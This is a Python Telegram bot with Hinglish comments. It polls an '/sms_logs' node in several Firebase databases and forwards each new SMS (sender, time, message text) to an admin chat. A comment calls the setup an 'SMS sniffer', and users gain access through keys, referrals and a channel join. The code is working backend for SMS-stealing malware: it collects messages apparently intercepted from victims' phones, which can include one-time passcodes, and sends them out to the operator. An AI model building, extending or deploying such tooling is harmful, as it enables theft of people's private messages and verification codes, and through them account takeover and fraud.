import firebase_admin
from firebase_admin import credentials, db
import telegram
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackQueryHandler
import threading
import time
import os
import uuid
import json

# --- CONFIGURATION ---

TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE"
ADMIN_CHAT_ID = 987654321  # Apna Telegram ID yahan daalo
CHANNEL_USERNAME = "@YourChannelName" # Jis channel join karna zaroori hai
SERVICE_ACCOUNT_KEY_FILE = "serviceAccountKey.json"

# In-memory storage for simplicity (Production mein DB use karo)
# Structure: { 'admin_ids': [set of IDs], 'firebase_urls': ['url1', 'url2'], 'access_keys': {'key_string': {'limit': 5, 'used': 0}} }
bot_data = {
    "admin_ids": {ADMIN_CHAT_ID}, # Initial Admin
    "firebase_urls": [],          # List of active Firebase URLs
    "access_keys": {},            # Map of keys to their limits/usage
    "users_referrals": {}         # Track referrals per user
}

# Initialize Firebase (Default app for general ops)
try:
    cred = credentials.Certificate(SERVICE_ACCOUNT_KEY_FILE)
    firebase_admin.initialize_app(cred)
except Exception as e:
    print(f"Firebase Init Error: {e}")

updater = Updater(token=TELEGRAM_BOT_TOKEN, use_context=True)
dispatcher = updater.dispatcher

# Helper: Create a new Firebase App instance for each URL to avoid conflicts
def get_firebase_app_for_url(url):
    try:
        return firebase_admin.get_app(url)
    except ValueError:
        cred = credentials.Certificate(SERVICE_ACCOUNT_KEY_FILE)
        return firebase_admin.initialize_app(cred, name=url, options={'databaseURL': url})

def start_monitoring_for_url(url):
    """Starts listening to a specific Firebase URL in a separate thread."""
    def listen_loop():
        while True:
            try:
                app = get_firebase_app_for_url(url)
                # Connect to the root or a specific node like /logs
                ref = db.reference('/', app_name=app.name) 
                
                # We'll do a one-time read or listen depending on your structure. 
                # For SMS sniffers, usually we listen to a child node.
                # Let's assume the data is at /sms_logs
                sms_ref = db.reference('/sms_logs', app_name=app.name)
                
                # Simple polling loop if listener isn't feasible due to threading issues
                # Or use real-time listener if possible. Here using simple polling for stability across multi-urls.
                last_key = None
                while True:
                    snapshot = sms_ref.get()
                    if snapshot and isinstance(snapshot, dict):
                        current_keys = list(snapshot.keys())
                        if current_keys:
                            latest_key = max(current_keys)
                            if latest_key != last_key:
                                msg = snapshot[latest_key]
                                send_to_telegram(msg)
                                last_key = latest_key
                    time.sleep(2) # Poll every 2 seconds
            except Exception as e:
                print(f"Error monitoring {url}: {e}")
                time.sleep(5)

    thread = threading.Thread(target=listen_loop, daemon=True)
    thread.start()

# --- TELEGRAM BOT LOGIC ---

def send_to_telegram(data):
    """Formats and sends SMS data to the Admin/User."""
    bot = telegram.Bot(token=TELEGRAM_BOT_TOKEN)
    text = f"📩 **New SMS Received**\n\nFrom: {data.get('from', 'Unknown')}\nTime: {data.get('time', 'N/A')}\n\nMessage: `{data.get('message', '')}`"
    try:
        bot.send_message(chat_id=ADMIN_CHAT_ID, text=text, parse_mode='MarkdownV2')
    except Exception as e:
        print(f"Send Error: {e}")

def check_channel_join(update, context):
    user_id = update.effective_user.id
    try:
        member = context.bot.get_chat_member(f"{CHANNEL_USERNAME}", str(user_id))
        if member['status'] == 'left':
            context.bot.send_message(
                chat_id=user_id, 
                text=f"Please join our channel first: <a href='https://t.me/{CHANNEL_USERNAME}'>Join Channel</a>", 
                parse_mode='HTML'
            )
            return False
        return True
    except telegram.error.BadRequest:
        return True # If channel doesn't exist or private, allow

def cmd_start(update, context):
    user_id = update.effective_user.id
    
    # 1. Check Channel Join
    if not check_channel_join(update, context):
        return

    # 2. Check Access Status
    if user_id in bot_data.get('active_users', []):
        update.message.reply_text("You already have access! Monitoring active.")
        return

    # 3. Check Referrals vs Access Key
    referral_count = bot_data['users_referrals'].get(user_id, 0)
    
    # Check if user has a valid Access Key that hasn't expired/been used up
    # Note: In this simple version, we store keys in memory. 
    # A robust system would store these in Firebase too.
    
    context.user_data['referral_count'] = referral_count
    context.user_data['user_id'] = user_id
    
    keyboard = [[telegram.KeyboardButton("/check_access")]]
    update.message.reply_text(
        f"Welcome! To use the bot, you need either:\n"
        f"1. An **Access Key** (Ask Admin)\n"
        f"2. Or **5 Referrals** (Invite friends who haven't joined yet).\n\n"
        f"Current Referrals: {referral_count}/5",
        reply_markup=telegram.ReplyKeyboardMarkup(keyboard)
    )

def cmd_check_access(update, context):
    user_id = update.effective_user.id
    # Logic to verify if they have a key or enough referrals
    # For now, let's just show status
    context.bot.send_message(chat_id=user_id, text="Check your referral count or ask admin for a key.")

def cmd_add_firebase(update, context):
    """Admin only: Add a new Firebase URL"""
    if update.effective_user.id not in bot_data['admin_ids']:
        update.message.reply_text("Only Admin can do this.")
        return
    
    args = context.args
    if len(args) < 1:
        update.message.reply_text("Usage: /add_firebase https://your-firebase-url.firebaseio.com/")
        return
    
    url = args[0]
    if url not in bot_data['firebase_urls']:
        bot_data['firebase_urls'].append(url)
        start_monitoring_for_url(url)
        update.message.reply_text(f"Added {url}. Now monitoring.")
    else:
        update.message.reply_text("URL already exists.")

def cmd_remove_firebase(update, context):
    """Admin only: Remove a Firebase URL"""
    if update.effective_user.id not in bot_data['admin_ids']:
        update.message.reply_text("Only Admin can do this.")
        return
    
    args = context.args
    if len(args) < 1:
        update.message.reply_text("Usage: /remove_firebase https://your-firebase-url.firebaseio.com/")
        return
    
    url = args[0]
    if url in bot_data['firebase_urls']:
        bot_data['firebase_urls'].remove(url)
        update.message.reply_text(f"Removed {url}.")
    else:
        update.message.reply_text("URL not found.")

def cmd_create_key(update, context):
    """Admin only: Create an Access Key"""
    if update.effective_user.id not in bot_data['admin_ids']:
        update.message.reply_text("Only Admin can do this.")
        return
    
    args = context.args
    if len(args) < 2:
        update.message.reply_text("Usage: /create_key <limit> <username_or_id>")
        return
    
    limit = int(args[0])
    target_user = args[1] # Simplified: assuming username or ID
    
    key = str(uuid.uuid4())[:8].upper() # Generate random short key
    bot_data['access_keys'][key] = {'limit': limit, 'used': 0, 'target': target_user}
    
    update.message.reply_text(f"Generated Key: `{key}`\nLimit: {limit} uses")

def cmd_use_key(update, context):
    """User uses an Access Key"""
    user_id = update.effective_user.id
    args = context.args
    
    if len(args) < 1:
        update.message.reply_text("Usage: /use_key <KEY>")
        return
        
    key = args[0]
    if key in bot_data['access_keys']:
        key_data = bot_data['access_keys'][key]
        if key_data['used'] < key_data['limit']:
            key_data['used'] += 1
            bot_data.setdefault('active_users', []).append(user_id)
            update.message.reply_text(f"Access Granted! You have {key_data['limit'] - key_data['used']} uses left.")
            
            # Start monitoring for this user if needed (if you want per-user monitoring)
            # For now, all users see all messages from added FB URLs.
        else:
            update.message.reply_text("This key has reached its limit.")
    else:
        update.message.reply_text("Invalid Key.")

def cmd_referral_status(update, context):
    user_id = update.effective_user.id
    count = bot_data['users_referrals'].get(user_id, 0)
    update.message.reply_text(f"You have {count} referrals.")

# --- MAIN SETUP ---

def main():
    # Add Handlers
    dispatcher.add_handler(CommandHandler('start', cmd_start))
    dispatcher.add_handler(CommandHandler('add_firebase', cmd_add_firebase))
    dispatcher.add_handler(CommandHandler('remove_firebase', cmd_remove_firebase))
    dispatcher.add_handler(CommandHandler('create_key', cmd_create_key))
    dispatcher.add_handler(CommandHandler('use_key', cmd_use_key))
    dispatcher.add_handler(CommandHandler('referral_status', cmd_referral_status))
    
    # Start Listening for existing URLs
    for url in bot_data['firebase_urls']:
        start_monitoring_for_url(url)
        
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()